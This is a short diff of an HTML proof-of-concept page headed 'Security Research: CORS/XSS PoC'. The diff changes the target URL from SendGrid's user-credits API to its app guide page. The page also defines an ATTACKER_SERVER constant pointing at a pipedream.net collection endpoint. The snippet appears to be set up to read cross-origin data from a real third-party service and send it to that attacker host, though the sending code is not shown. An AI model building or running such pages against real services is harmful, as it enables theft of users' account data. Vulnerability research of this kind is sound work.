@@ -16,7 +16,7 @@
 
 <div class="card">
     <h1>Security Research: CORS/XSS PoC</h1>
-    <p><strong>Target URL:</strong> <code id="target-display">https://api.sendgrid.com/v3/user/credits</code></p>
+    <p><strong>Target URL:</strong> <code id="target-display">https://app.sendgrid.com/guide</code></p>
     <p><strong>Attacker Origin:</strong> <code id="attacker-display"></code></p>
     <hr>
     <div id="status-box" class="status">
@@ -25,7 +25,7 @@
 </div>
 
 <script>
-    const TARGET_API = "https://api.sendgrid.com/v3/user/credits"; 
+    const TARGET_API = "https://app.sendgrid.com/guide"; 
     const ATTACKER_SERVER = "https://eo95zv3v5okp4gx.m.pipedream.net"; 
 
     document.getElementById('attacker-display').innerText = window.location.origin;
